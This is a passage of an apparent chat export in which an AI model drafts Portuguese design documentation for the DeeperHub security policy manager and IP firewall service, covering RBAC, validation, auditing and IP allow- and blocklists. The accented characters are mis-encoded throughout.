Uma caracter√≠stica chave deste m√≥dulo √© a integra√ß√£o com o sistema de Controle de Acesso Baseado em Pap√©is (`DeeperHub.RBAC`), garantindo que apenas usu√°rios autorizados (tipicamente administradores de seguran√ßa) possam visualizar e modificar configura√ß√µes cr√≠ticas de seguran√ßa. Todas as altera√ß√µes de pol√≠tica s√£o, idealmente, auditadas.

Este m√≥dulo abstrai o armazenamento subjacente das pol√≠ticas (que pode ser o `DeeperHub.Core.ConfigManager` ou um armazenamento dedicado) e adiciona uma camada de valida√ß√£o, autoriza√ß√£o e l√≥gica de neg√≥cio espec√≠fica para pol√≠ticas de seguran√ßa. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento Centralizado de Pol√≠ticas:**
    *   Servir como o ponto √∫nico de verdade para a configura√ß√£o de todas as pol√≠ticas de seguran√ßa.
*   **Defini√ß√£o e Atualiza√ß√£o de Pol√≠ticas:**
    *   Permitir a cria√ß√£o e atualiza√ß√£o de pol√≠ticas para diversas √°reas (ex: `update_security_config/4`).
    *   Suportar pol√≠ticas com diferentes escopos (global, por tipo de usu√°rio, por tenant, etc.), se necess√°rio.
*   **Consulta de Pol√≠ticas:**
    *   Fornecer uma API para que outros m√≥dulos de seguran√ßa consultem as pol√≠ticas relevantes para suas opera√ß√µes (`get_security_configs/2`).
    *   Obter pol√≠ticas modificadas em rela√ß√£o aos valores padr√£o (`get_modified_configs/2`).
*   **Valida√ß√£o de Pol√≠ticas:**
    *   Validar os valores das pol√≠ticas antes de aplic√°-los para garantir que s√£o v√°lidos e consistentes (via `DeeperHub.Security.Validation.SecurityInputValidation`).
*   **Autoriza√ß√£o RBAC:**
    *   Integrar com `DeeperHub.RBAC` para garantir que apenas usu√°rios com as permiss√µes adequadas possam visualizar ou modificar pol√≠ticas de seguran√ßa (via `DeeperHub.Security.Policy.SecurityPolicyAuthorization`).
*   **Redefini√ß√£o para Padr√µes:**
    *   Permitir a redefini√ß√£o de pol√≠ticas para seus valores padr√£o de f√°brica (`reset_security_config/3`).
*   **Auditoria de Mudan√ßas de Pol√≠tica:**
    *   Integrar com `DeeperHub.Audit` para registrar todas as altera√ß√µes nas pol√≠ticas de seguran√ßa, incluindo quem fez a altera√ß√£o, quando e qual foi a mudan√ßa.
*   **Notifica√ß√£o de Mudan√ßas de Pol√≠tica (Opcional):**
    *   Publicar eventos no `Core.EventBus` quando pol√≠ticas de seguran√ßa cr√≠ticas s√£o alteradas, permitindo que os sistemas relevantes recarreguem suas configura√ß√µes.
*   **Interface para Diferentes Tipos de Pol√≠tica:**
    *   Gerenciar pol√≠ticas para:
        *   Limiares de Risco (`RiskAssessment`).
        *   Pesos de Fatores de Risco (`RiskAssessment`).
        *   Regras de A√ß√£o de Risco (`RiskAssessment`).
        *   Limiares de For√ßa Bruta (`BruteForceProtection`).
        *   Dura√ß√£o de Bloqueios (`BruteForceProtection`, `IPFirewallService`).
        *   Regras de MFA (`DeeperHub.MFA.MFAPolicyService`).
        *   Pol√≠ticas de Sess√£o (`DeeperHub.SessionPolicy`).
        *   Configura√ß√µes de Criptografia (ex: frequ√™ncia de rota√ß√£o de chaves).
        *   Listas de IPs/Dom√≠nios Permitidos/Bloqueados (`IPFirewallService`, `EmailValidator`).
        *   E outras configura√ß√µes de seguran√ßa.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.Policy.SecurityPolicyManager` (Fachada P√∫blica):**
    *   Ponto de entrada para gerenciamento de pol√≠ticas.
    *   Delega para o `SecurityPolicyService` (ou GenServer interno).
2.  **`DeeperHub.Security.Policy.SecurityPolicyService` (GenServer ou M√≥dulo de Servi√ßo):**
    *   **Responsabilidade:** Orquestra a l√≥gica de gerenciamento de pol√≠ticas.
    *   **Intera√ß√µes:**
        *   `SecurityPolicyAuthorization`: Para verificar permiss√µes do usu√°rio que est√° tentando modificar/visualizar.
        *   `DeeperHub.Security.Validation.SecurityInputValidation`: Para validar novos valores de pol√≠tica.
        *   `DeeperHub.Core.ConfigManager`: Como o *backend de armazenamento prim√°rio* para as pol√≠ticas. O `SecurityPolicyManager` atua como uma camada de l√≥gica de neg√≥cio e seguran√ßa sobre o `ConfigManager` para configura√ß√µes especificamente de seguran√ßa.
        *   `DeeperHub.Audit`: Para registrar altera√ß√µes.
        *   `DeeperHub.Core.EventBus` (opcional): Para notificar mudan√ßas.
3.  **`DeeperHub.Security.Policy.SecurityPolicyAuthorization`:**
    *   **Responsabilidade:** Cont√©m a l√≥gica para verificar se um usu√°rio tem permiss√£o (via `DeeperHub.RBAC`) para acessar ou modificar uma determinada pol√≠tica ou √°rea de pol√≠tica.
4.  **`DeeperHub.Security.Validation.SecurityInputValidation`:**
    *   Cont√©m schemas e fun√ß√µes de valida√ß√£o espec√≠ficas para diferentes tipos de pol√≠ticas de seguran√ßa (ex: `validate_ip_firewall_config`, `validate_mfa_policy`).
5.  **`DeeperHub.Core.ConfigManager` (Backend de Armazenamento):**
    *   As pol√≠ticas de seguran√ßa s√£o, em √∫ltima an√°lise, configura√ß√µes armazenadas e gerenciadas pelo `ConfigManager`. O `SecurityPolicyManager` garante que o acesso e a modifica√ß√£o dessas configura√ß√µes espec√≠ficas de seguran√ßa sigam um fluxo controlado.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/policy/
‚îú‚îÄ‚îÄ security_policy_manager.ex          # Fachada P√∫blica
‚îú‚îÄ‚îÄ security_policy_service.ex          # L√≥gica de Servi√ßo (pode ser GenServer)
‚îú‚îÄ‚îÄ security_policy_authorization.ex    # L√≥gica de autoriza√ß√£o RBAC
‚îÇ
‚îî‚îÄ‚îÄ supervisor.ex                       # Supervisor (se SecurityPolicyService for GenServer)

lib/deeper_hub/security/validation/     # (J√° existe, mas SecurityInputValidation √© usado aqui)
‚îî‚îÄ‚îÄ security_input_validation.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Camada de Abstra√ß√£o sobre `ConfigManager`:** Em vez de os m√≥dulos de seguran√ßa acessarem diretamente o `ConfigManager` para todas as suas configura√ß√µes, eles podem passar pelo `SecurityPolicyManager` para obter configura√ß√µes que s√£o consideradas \"pol√≠ticas de seguran√ßa\". Isso centraliza a l√≥gica de autoriza√ß√£o e valida√ß√£o espec√≠fica de seguran√ßa.
*   **RBAC para Modifica√ß√µes:** Qualquer altera√ß√£o em uma pol√≠tica de seguran√ßa deve ser estritamente controlada por permiss√µes RBAC.
*   **Valores Padr√£o Robustos:** O sistema deve ter valores padr√£o seguros para todas as pol√≠ticas, caso n√£o sejam explicitamente configurados.
*   **Clareza na Nomenclatura das Chaves:** As chaves de configura√ß√£o usadas para pol√≠ticas de seguran√ßa no `ConfigManager` devem seguir um padr√£o claro (ex: `security.policy.brute_force.login.max_attempts`).

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Administrador de Seguran√ßa Define Limite de Tentativas de Login:**
    *   Admin acessa a interface de gerenciamento de pol√≠ticas.
    *   Tenta atualizar a pol√≠tica `brute_force.login.max_attempts` para `3`.
    *   A UI chama `SecurityPolicyManager.update_security_config(admin_user_id, \"security.policy.brute_force.login.max_attempts\", 3, opts)`.
    *   `SecurityPolicyAuthorization` verifica se `admin_user_id` tem permiss√£o para alterar pol√≠ticas de for√ßa bruta.
    *   `SecurityInputValidation` valida se `3` √© um valor aceit√°vel para essa pol√≠tica.
    *   `SecurityPolicyService` chama `Core.ConfigManager.set(\"security.policy.brute_force.login.max_attempts\", 3, ...)`.
    *   `Audit` registra a altera√ß√£o.
*   **M√≥dulo `RiskAssessment` Consulta Limiar de Risco:**
    *   `RiskCalculatorService` precisa do limiar para classificar um score como `:high`.
    *   Chama `SecurityPolicyManager.get_security_configs(nil, %{config_key_prefix: \"security.policy.risk_assessment.thresholds\"})` ou diretamente `Core.ConfigManager.get(\"security.policy.risk_assessment.thresholds.high\", \"global\", 75)`. A primeira op√ß√£o √© prefer√≠vel se houver l√≥gica de autoriza√ß√£o para *visualizar* certas pol√≠ticas.
*   **Sistema Redefine Pol√≠tica de MFA para o Padr√£o:**
    *   Um administrador solicita a redefini√ß√£o da pol√≠tica de MFA.
    *   A UI chama `SecurityPolicyManager.reset_security_config(admin_user_id, \"security.policy.mfa.default_method\", opts)`.

## üåä 5. Fluxos Importantes

### Fluxo de Atualiza√ß√£o de uma Pol√≠tica de Seguran√ßa

1.  **Interface (Admin UI/Console):** Um usu√°rio administrador tenta modificar uma pol√≠tica (ex: aumentar o TTL da sess√£o).
2.  **Chamada √† Fachada:** A interface chama `DeeperHub.Security.Policy.SecurityPolicyManager.update_security_config(admin_user_id, \"security.policy.session.max_duration_seconds\", 7200, %{reason: \"Policy review\"})`.
3.  **`SecurityPolicyService`:**
    *   Recebe a solicita√ß√£o.
    *   Chama `SecurityPolicyAuthorization.authorize_config_change(admin_user_id, \"security.policy.session.max_duration_seconds\")`.
        *   **Falha na Autoriza√ß√£o:** Retorna `{:error, :unauthorized}`.
    *   Se autorizado, chama `DeeperHub.Security.Validation.SecurityInputValidation.validate_security_policy(7200, :session_duration, opts)`.
        *   **Falha na Valida√ß√£o:** Retorna `{:error, :validation_failed, errors}`.
    *   Se validado, chama `DeeperHub.Core.ConfigManager.set(\"security.policy.session.max_duration_seconds\", 7200, %{scope: \"global\", description: \"Max session TTL\", created_by: admin_user_id})`.
    *   Se `ConfigManager.set` for bem-sucedido:
        *   Chama `DeeperHub.Audit.log_event(...)` para registrar a altera√ß√£o da pol√≠tica.
        *   (Opcional) Publica um evento `config_changed` ou `security_policy_changed` no `Core.EventBus`.
        *   Retorna `{:ok, 7200}`.
    *   Se `ConfigManager.set` falhar, propaga o erro.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Security.Policy.SecurityPolicyManager`)

### 6.1. `DeeperHub.Security.Policy.SecurityPolicyManager.get_security_configs(requesting_user_id :: String.t() | nil, opts :: keyword()) :: {:ok, map()} | {:error, :unauthorized | term()}`

*   **Descri√ß√£o:** Obt√©m as configura√ß√µes de seguran√ßa que o `requesting_user_id` tem permiss√£o para visualizar. Se `requesting_user_id` for `nil` (sistema interno), pode retornar todas.
*   **`opts`:**
    *   `:policy_area` (atom | String.t | nil): Filtra por uma √°rea espec√≠fica de pol√≠tica (ex: `:brute_force`, `\"risk_assessment.thresholds\"`).
    *   `:keys_only` (boolean): Retorna apenas as chaves das pol√≠ticas, n√£o os valores.
*   **Retorno:** Um mapa onde as chaves s√£o os nomes das pol√≠ticas (ex: `\"security.mfa.required_for_admin\"`) e os valores s√£o os valores das pol√≠ticas.

### 6.2. `DeeperHub.Security.Policy.SecurityPolicyManager.update_security_config(admin_user_id :: String.t(), config_key :: String.t(), new_value :: term(), opts :: keyword()) :: {:ok, term()} | {:error, :unauthorized | :validation_failed | term()}`

*   **Descri√ß√£o:** Atualiza o valor de uma pol√≠tica de seguran√ßa espec√≠fica. Requer que `admin_user_id` tenha as permiss√µes adequadas.
*   **`config_key`:** A chave completa da pol√≠tica no `ConfigManager` (ex: `\"security.brute_force.login.max_attempts\"`).
*   **`new_value`:** O novo valor para a pol√≠tica.
*   **`opts`:**
    *   `:reason` (String.t): Motivo da altera√ß√£o, para auditoria.
    *   `:scope` (String.t): Escopo da configura√ß√£o no ConfigManager. (Padr√£o: `\"global\"`)
*   **Retorno:** `{:ok, new_value_applied}` ou erro.

### 6.3. `DeeperHub.Security.Policy.SecurityPolicyManager.update_multiple_configs(admin_user_id :: String.t(), configs_map :: map(), opts :: keyword()) :: {:ok, updated_configs :: map()} | {:error, :unauthorized | :validation_failed | term()}`

*   **Descri√ß√£o:** Atualiza m√∫ltiplas pol√≠ticas de seguran√ßa em uma √∫nica opera√ß√£o transacional (se poss√≠vel pelo `ConfigManager`).
*   **`configs_map`:** Mapa de `{config_key, new_value}`.

### 6.4. `DeeperHub.Security.Policy.SecurityPolicyManager.reset_security_config(admin_user_id :: String.t(), config_key :: String.t(), opts :: keyword()) :: {:ok, default_value :: term()} | {:error, :unauthorized | term()}`

*   **Descri√ß√£o:** Redefine uma pol√≠tica de seguran√ßa para seu valor padr√£o do sistema.
*   **Retorno:** `{:ok, default_value_restored}` ou erro.

## ‚öôÔ∏è 7. Configura√ß√£o

O pr√≥prio `SecurityPolicyManager` pode ter algumas configura√ß√µes no `Core.ConfigManager`:
*   `[:security, :policy_manager, :default_policy_values_module]` (Module): M√≥dulo que define os valores padr√£o de f√°brica para todas as pol√≠ticas de seguran√ßa. Isso √© usado pela fun√ß√£o `reset_security_config`.
*   `[:security, :policy_manager, :rbac_permissions, :view_policy_prefix]` (String): Prefixo da permiss√£o RBAC necess√°ria para visualizar pol√≠ticas (ex: `\"security.policy.view.\"`).
*   `[:security, :policy_manager, :rbac_permissions, :edit_policy_prefix]` (String): Prefixo da permiss√£o RBAC necess√°ria para editar pol√≠ticas (ex: `\"security.policy.edit.\"`).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Como backend de armazenamento para as pol√≠ticas.
*   `DeeperHub.Core.Logger`, `Core.Metrics`, `Core.EventBus`.
*   `DeeperHub.RBAC`: Para verificar permiss√µes de acesso e modifica√ß√£o das pol√≠ticas.
*   `DeeperHub.Security.Validation.SecurityInputValidation`: Para validar os valores das pol√≠ticas.
*   `DeeperHub.Audit`: Para registrar altera√ß√µes nas pol√≠ticas.

### 8.2. Bibliotecas Externas

*   Nenhuma espec√≠fica, al√©m das usadas pelos m√≥dulos Core.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **M√≥dulos de Seguran√ßa:** Em vez de chamarem `Core.ConfigManager.get/3` diretamente para suas configura√ß√µes operacionais, os m√≥dulos como `BruteForceProtection`, `RiskAssessment`, etc., devem chamar `SecurityPolicyManager.get_security_configs/2` (ou uma fun√ß√£o mais espec√≠fica se criada) para obter suas pol√≠ticas. Isso garante que a obten√ß√£o de pol√≠ticas tamb√©m possa, se necess√°rio, passar por uma camada de l√≥gica (embora para leitura, a autoriza√ß√£o seja menos comum do que para escrita).
    ```elixir
    # Em BruteForceProtectionService
    defp get_login_max_attempts do
      # Poderia ser Core.ConfigManager.get(\"security.policy.brute_force.login.max_attempts\", \"global\", 5)
      # Ou, para centralizar l√≥gica de pol√≠ticas de seguran√ßa:
      case SecurityPolicyManager.get_security_configs(nil, policy_area: \"brute_force.login\") do
        {:ok, %{\"security.policy.brute_force.login.max_attempts\" => val}} -> val
        _ -> 5 # Fallback para um padr√£o seguro do c√≥digo
      end
    end
    ```
*   **Interfaces de Administra√ß√£o:** Qualquer UI ou comando de console que permita a visualiza√ß√£o ou modifica√ß√£o de pol√≠ticas de seguran√ßa deve usar o `SecurityPolicyManager` para garantir que as verifica√ß√µes de autoriza√ß√£o e valida√ß√£o sejam aplicadas.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o acesso e modifica√ß√£o de pol√≠ticas com diferentes pap√©is de usu√°rio (com e sem permiss√£o).
*   Testar a valida√ß√£o de diferentes tipos de valores de pol√≠tica.
*   Testar a redefini√ß√£o de pol√≠ticas para o padr√£o.
*   Verificar se as altera√ß√µes s√£o corretamente persistidas no `ConfigManager` e se os eventos de auditoria s√£o gerados.
*   Localiza√ß√£o: `test/deeper_hub/security/policy/`.

### 10.2. M√©tricas

*   `deeper_hub.security.policy_manager.configs.viewed.count` (tags: `requesting_user_role`, `policy_area`)
*   `deeper_hub.security.policy_manager.configs.updated.count` (tags: `admin_user_role`, `policy_key`, `status` (`success`, `unauthorized`, `validation_failed`))
*   `deeper_hub.security.policy_manager.configs.reset.count` (tags: `admin_user_role`, `policy_key`)

### 10.3. Logs

*   **N√≠vel INFO:** Altera√ß√µes de pol√≠tica bem-sucedidas (quem, o qu√™, quando, porqu√™).
*   **N√≠vel WARNING:** Tentativas n√£o autorizadas de visualizar ou modificar pol√≠ticas. Falhas de valida√ß√£o ao tentar definir uma pol√≠tica.
*   **N√≠vel ERROR:** Erros internos no `SecurityPolicyService`.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :policy_manager, :config_access, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, action: :view | :update | :reset, keys_accessed: list_of_keys, authorized: boolean}`
*   `[:deeper_hub, :security, :policy_manager, :config_validation, :stop]`
    *   Metadados: `%{key: key, value_provided: val, is_valid: boolean, errors: errors_if_any}`

## ‚ùå 11. Tratamento de Erros

*   Falhas de autoriza√ß√£o devem retornar claramente `{:error, :unauthorized}`.
*   Falhas de valida√ß√£o devem retornar `{:error, :validation_failed, details}`.
*   Se o `ConfigManager` falhar ao persistir uma pol√≠tica, o erro deve ser propagado.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Permiss√µes RBAC:** A defini√ß√£o de quais pap√©is podem gerenciar quais pol√≠ticas √© a principal linha de defesa. Essas permiss√µes devem ser o mais granulares poss√≠vel (ex: um papel pode gerenciar pol√≠ticas de MFA, outro pode gerenciar pol√≠ticas de firewall).
*   **Auditoria Imut√°vel:** Os logs de auditoria para altera√ß√µes de pol√≠tica devem ser protegidos contra adultera√ß√£o.
*   **Valores Padr√£o Seguros:** O sistema deve funcionar de forma segura mesmo se nenhuma pol√≠tica for explicitamente configurada, usando os padr√µes de f√°brica.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar novas √°reas de pol√≠tica de seguran√ßa, defina as permiss√µes RBAC correspondentes em `SecurityPolicyAuthorization`.
*   Adicione fun√ß√µes de valida√ß√£o em `SecurityInputValidation` para os novos tipos de pol√≠tica.
*   Garanta que os valores padr√£o para novas pol√≠ticas sejam seguros.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma UI administrativa para facilitar o gerenciamento visual das pol√≠ticas de seguran√ßa.
*   [ ] Adicionar versionamento de pol√≠ticas, permitindo rollback para configura√ß√µes anteriores.
*   [ ] Permitir a importa√ß√£o/exporta√ß√£o de conjuntos de pol√≠ticas (ex: para replicar configura√ß√µes entre ambientes).
*   [ ] Introduzir \"perfis de pol√≠tica de seguran√ßa\" (ex: \"Alta Seguran√ßa\", \"Conveni√™ncia Equilibrada\") que administradores podem aplicar globalmente.
*   [ ] Adicionar valida√ß√µes mais complexas entre pol√≠ticas (ex: garantir que o TTL da sess√£o n√£o seja menor que o timeout de inatividade do MFA).

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Este m√≥dulo age como um guardi√£o para as configura√ß√µes de seguran√ßa.

Agora, podemos ir para `DeeperHub.Security.IPFirewallService` (que foi referenciado aqui e √© um consumidor de pol√≠ticas), ou talvez detalhar o `DeeperHub.Core.Cache`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos detalhar o `DeeperHub.Security.IPFirewallService`. Este servi√ßo √© uma linha de defesa importante, controlando o acesso √† aplica√ß√£o com base em endere√ßos IP.

---

# M√≥dulo: `DeeperHub.Security.IPFirewallService` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.IPFirewallService`

O m√≥dulo `DeeperHub.Security.IPFirewallService` √© respons√°vel por gerenciar e aplicar regras de firewall baseadas em endere√ßos IP para o sistema DeeperHub. Ele permite a cria√ß√£o de listas de permiss√£o (allowlists) e listas de bloqueio (blocklists) de IPs, controlando quais endere√ßos podem ou n√£o acessar a aplica√ß√£o ou partes dela.

Este servi√ßo √© crucial para mitigar amea√ßas como tr√°fego malicioso conhecido, ataques de bots, e para restringir o acesso a recursos sens√≠veis apenas a redes confi√°veis. Ele trabalha em conjunto com o `DeeperHub.Security.Cache.SecurityCache` para performance e com o `DeeperHub.Security.Policy.SecurityPolicyManager` para configura√ß√µes. üòä

*(Nota: A documenta√ß√£o original mencionava `DeeperHub.Security.Config.IPFirewallConfig` e `DeeperHub.Security.Services.IpFirewallService` e `DeeperHub.Security.Plugs.IPFirewallPlug`. Esta documenta√ß√£o consolida a l√≥gica de servi√ßo em `IPFirewallService` e a configura√ß√£o via `SecurityPolicyManager` ou `Core.ConfigManager`.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de Listas de Bloqueio (Blocklists):**
    *   Permitir o bloqueio de endere√ßos IP espec√≠ficos ou ranges CIDR (`block_ip/4`).
    *   Suportar bloqueios tempor√°rios (com expira√ß√£o) e permanentes.
    *   Manter um registro do motivo e da origem do bloqueio.
*   **Gerenciamento de Listas de Permiss√£o (Allowlists/Whitelists):**
    *   Permitir a adi√ß√£o de IPs ou ranges CIDR que sempre ter√£o acesso, mesmo que outras regras os bloqueiem (`allow_ip/4`).
    *   Suportar permiss√µes tempor√°rias e permanentes.
*   **Verifica√ß√£o de IP:**
    *   Verificar se um determinado endere√ßo IP est√° bloqueado (`is_blocked?/1`).
    *   Verificar se um determinado endere√ßo IP est√° explicitamente permitido (`is_allowed?/1`).
*   **Aplica√ß√£o de Regras:**
    *   Fornecer uma interface para que Plugs (como `IPFirewallPlug`) ou outros m√≥dulos verifiquem o status de um IP e tomem a√ß√µes (permitir/negar acesso).
    *   A l√≥gica de preced√™ncia (ex: allowlist sobrep√µe blocklist) deve ser clara.
*   **Limpeza de Entradas Expiradas:**
    *   Remover automaticamente bloqueios e permiss√µes tempor√°rias que expiraram (pode ser via TTL do cache ou um worker de limpeza).
*   **Integra√ß√£o com Cache:**
    *   Utilizar `DeeperHub.Security.Cache.SecurityCache` para armazenar listas de bloqueio/permiss√£o para acesso r√°pido e eficiente.
*   **Configurabilidade:**
    *   Carregar listas iniciais de IPs bloqueados/permitidos de arquivos de configura√ß√£o ou do `SecurityPolicyManager`.
    *   Configurar dura√ß√µes padr√£o para bloqueios/permiss√µes tempor√°rias.
*   **Observabilidade:**
    *   Registrar m√©tricas sobre o n√∫mero de IPs bloqueados/permitidos, e o n√∫mero de requisi√ß√µes bloqueadas/permitidas pelo firewall.
    *   Logar a√ß√µes de bloqueio, permiss√£o e verifica√ß√µes significativas.
*   **Auditoria:**
    *   Integrar com `DeeperHub.Audit` para registrar quem adicionou/removeu IPs das listas e por qu√™.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.IPFirewallService` (Fachada/Servi√ßo Principal):**
    *   **Responsabilidade:** Ponto de entrada para todas as opera√ß√µes de gerenciamento de firewall de IP. Cont√©m a l√≥gica de neg√≥cio principal.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Security.Cache.SecurityCache`: Para ler e escrever o status de bloqueio/permiss√£o de IPs.
        *   `DeeperHub.Core.Repo` (via `DeeperHub.Security.Schema.IPBlock` e `IPAllow`): Para persistir bloqueios/permiss√µes permanentes ou para recupera√ß√£o do cache ap√≥s rein√≠cio.
        *   `DeeperHub.Security.Policy.SecurityPolicyManager` ou `Core.ConfigManager`: Para obter configura√ß√µes como dura√ß√µes padr√£o, listas iniciais.
        *   `DeeperHub.Audit`: Para registrar modifica√ß√µes nas listas.
        *   `DeeperHub.Core.EventBus` (opcional): Para publicar eventos sobre IPs bloqueados/desbloqueados.
2.  **`DeeperHub.Security.Cache.SecurityCache`:**
    *   **Responsabilidade:** Armazenar em cache (provavelmente ETS) os IPs bloqueados e permitidos com seus TTLs para verifica√ß√£o de alta performance. As chaves podem ser prefixadas (ex: `\"ip_firewall:blocked:<ip_address>\"`).
3.  **`DeeperHub.Security.Schema.IPBlock` e `DeeperHub.Security.Schema.IPAllow` (Ecto Schemas):**
    *   **Responsabilidade:** Definem a estrutura para persistir bloqueios e permiss√µes permanentes ou de longa dura√ß√£o no banco de dados.
4.  **`DeeperHub.Security.Plugs.IPFirewallPlug` (Phoenix Plug):**
    *   **Responsabilidade:** Integrar com o pipeline de requisi√ß√µes web para verificar cada requisi√ß√£o recebida contra o `IPFirewallService`.
    *   **Intera√ß√µes:** Chama `IPFirewallService.is_blocked?/1` e `is_allowed?/1`.
5.  **Configura√ß√µes (via `Core.ConfigManager` / `SecurityPolicyManager`):**
    *   Listas de IPs permanentemente bloqueados/permitidos.
    *   Dura√ß√£o padr√£o para bloqueios/permiss√µes tempor√°rias.
    *   Intervalo de limpeza do cache (se n√£o for puramente baseado em TTL).

### 3.2. Estrutura de Diret√≥rios (Proposta)

Dentro de `lib/deeper_hub/security/`:
```
‚îú‚îÄ‚îÄ ip_firewall_service.ex            # L√≥gica de Servi√ßo Principal (pode ser GenServer para tarefas como carregar do DB para ETS)
‚îÇ
‚îú‚îÄ‚îÄ config/                           # (Onde IPFirewallConfig residia)
‚îÇ   ‚îî‚îÄ‚îÄ (As fun√ß√µes de config agora seriam parte do SecurityPolicyManager ou Core.ConfigManager)
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Pode estar em um diret√≥rio de schemas de seguran√ßa global)
‚îÇ   ‚îú‚îÄ‚îÄ ip_block.ex
‚îÇ   ‚îî‚îÄ‚îÄ ip_allow.ex
‚îÇ
‚îî‚îÄ‚îÄ plugs/                            # (Se o Plug for espec√≠fico deste m√≥dulo e n√£o em _web)
    ‚îî‚îÄ‚îÄ ip_firewall_plug.ex
```
O `SecurityCache` j√° est√° em `security/cache/`.

### 3.3. Decis√µes de Design Importantes

*   **Performance da Verifica√ß√£o:** A verifica√ß√£o `is_blocked?/is_allowed?` deve ser extremamente r√°pida, pois ser√° chamada em cada requisi√ß√£o. Da√≠ a import√¢ncia do cache em mem√≥ria (ETS).
*   **Persist√™ncia vs. Cache:**
    *   Bloqueios/permiss√µes tempor√°rios (ex: por algumas horas) podem residir apenas no cache ETS com TTL.
    *   Bloqueios/permiss√µes permanentes ou de longa dura√ß√£o devem ser persistidos no banco de dados e carregados no cache ETS na inicializa√ß√£o ou sob demanda.
*   **Granularidade:** Suporte para IPs individuais e ranges CIDR.
*   **Preced√™ncia:** Definir claramente a ordem de verifica√ß√£o (ex: Allowlist tem preced√™ncia sobre Blocklist).
*   **Gerenciamento:** Deve haver uma forma (API, Console) para administradores gerenciarem as listas.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Requisi√ß√£o de IP Bloqueado:**
    *   `IPFirewallPlug` intercepta uma requisi√ß√£o.
    *   Chama `IPFirewallService.is_blocked?(\"1.2.3.4\")`.
    *   Servi√ßo verifica no cache. Se bloqueado, o Plug retorna uma resposta 403 Forbidden.
*   **Administrador Bloqueia um IP Permanentemente:**
    *   Admin usa o `DeeperHub.Console` ou UI para bloquear um IP.
    *   Chama `IPFirewallService.block_ip(\"5.6.7.8\", \"Fonte de ataque conhecido\", nil, %{admin_id: \"admin1\"})`.
    *   Servi√ßo persiste no DB, atualiza o cache e audita a a√ß√£o.
*   **Servi√ßo de Detec√ß√£o de Intrus√£o Bloqueia IP Temporariamente:**
    *   `DeeperHub.Security.IntrusionDetection` detecta atividade suspeita.
    *   Chama `IPFirewallService.block_ip(\"9.10.11.12\", \"M√∫ltiplas tentativas de SQLi\", 3600)`.
    *   Servi√ßo adiciona ao cache com TTL de 1 hora.
*   **Adicionar Rede Corporativa √† Allowlist:**
    *   Admin configura `IPFirewallService.allow_ip(\"192.168.1.0/24\", \"Rede Interna\", nil)`.
    *   Requisi√ß√µes dessa rede bypassar√£o outras verifica√ß√µes de blocklist.

## üåä 5. Fluxos Importantes

### Fluxo de Verifica√ß√£o de IP pelo `IPFirewallPlug`

1.  **Requisi√ß√£o Entra:** Chega uma nova requisi√ß√£o HTTP.
2.  **`IPFirewallPlug.call/2`:**
    *   Extrai o IP do cliente da `conn`.
    *   Chama `DeeperHub.Security.IPFirewallService.is_allowed?(client_ip)`.
    *   **Se Permitido (`true`):** A requisi√ß√£o prossegue no pipeline.
    *   **Se N√£o Permitido ou Erro:** Chama `DeeperHub.Security.IPFirewallService.is_blocked?(client_ip)`.
        *   **Se Bloqueado (`true`):**
            *   Loga a tentativa de acesso bloqueada.
            *   Incrementa m√©trica `requests_blocked_by_firewall`.
            *   Retorna uma resposta `403 Forbidden` e interrompe (`halt`) a `conn`.
        *   **Se N√£o Bloqueado ou Erro na Verifica√ß√£o de Bloqueio:** A requisi√ß√£o prossegue (ou trata o erro de verifica√ß√£o como um \"permitir com aviso\").
3.  **Requisi√ß√£o Prossegue:** Se n√£o bloqueado/explicitamente permitido, continua para os pr√≥ximos plugs.

### Fluxo de Bloqueio de IP (Permanente)

1.  **Solicita√ß√£o de Bloqueio:** Administrador chama `IPFirewallService.block_ip(ip, reason, nil, metadata)`.
2.  **`IPFirewallService`:**
    *   Valida o formato do IP e os par√¢metros.
    *   Cria/Atualiza um registro `IPBlock` no banco de dados (via `Core.Repo`).
    *   Se a persist√™ncia for bem-sucedida:
        *   Atualiza o `SecurityCache` adicionando o IP √† lista de bloqueados (sem TTL se o bloqueio for permanente).
        *   Registra a a√ß√£o no `DeeperHub.Audit`.
        *   (Opcional) Publica um evento `ip_blocked` no `Core.EventBus`.
    *   Retorna `{:ok, block_info}` ou `{:error, reason}`.

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

### 6.1. `DeeperHub.Security.IPFirewallService.is_blocked?(ip_address :: String.t()) :: boolean()`

*   **Descri√ß√£o:** Verifica se um IP est√° atualmente na blocklist (considerando TTLs de bloqueios tempor√°rios).
*   **Retorno:** `true` se bloqueado, `false` caso contr√°rio.

### 6.2. `DeeperHub.Security.IPFirewallService.is_allowed?(ip_address :: String.t()) :: boolean()`

*   **Descri√ß√£o:** Verifica se um IP est√° atualmente na allowlist (considerando TTLs).

### 6.3. `DeeperHub.Security.IPFirewallService.block_ip(ip_address :: String.t(), reason :: String.t(), duration_seconds :: integer() | nil, metadata :: map() | nil) :: {:ok, IPBlock.t()} | {:error, Ecto.Changeset.t() | term()}`

